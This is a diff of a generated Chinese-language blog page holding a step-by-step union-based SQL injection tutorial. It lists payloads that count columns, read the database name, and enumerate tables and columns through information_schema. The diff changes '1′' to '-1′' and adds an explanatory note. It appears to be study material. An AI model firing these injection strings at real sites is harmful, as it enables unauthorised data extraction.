@@ -79,13 +79,13 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta property="og:title" content="分类">
+<meta property="og:url" content="http://yoursite.com/categories/index.html">
 <meta property="og:site_name" content="从零开始的学习生涯">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-26T04:50:25.031Z">
+<meta property="og:updated_time" content="2018-01-26T04:50:14.525Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="分类">
 
 
 
@@ -113,7 +113,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/categories/"/>
 
 
 
@@ -362,11 +362,14 @@
 <pre><code>1′ or 1=1 order by 1,2,3,4,5 #
 </code></pre><p>数字累加，直到不出结果或者报错。</p>
 <p>或者用：</p>
-<pre><code>1′ union select 1,2 #
+<pre><code>-1′ union select 1,2 #
 </code></pre><p>顺路进行下一步</p>
-<h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><pre><code>1′ union select 1,2 #
-</code></pre><h2 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h2><pre><code>1′ union select 1,database() #
-</code></pre><h2 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h2><pre><code>1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+<hr>
+<p><strong>两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</strong></p>
+<hr>
+<h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><pre><code>-1′ union select 1,2 #
+</code></pre><h2 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h2><pre><code>-1′ union select 1,database() #
+</code></pre><h2 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h2><pre><code>-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
 </code></pre><p>从information_schema中查找表名</p>
 <h2 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h2><pre><code>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #
 </code></pre><p>爆users表内的表名</p>
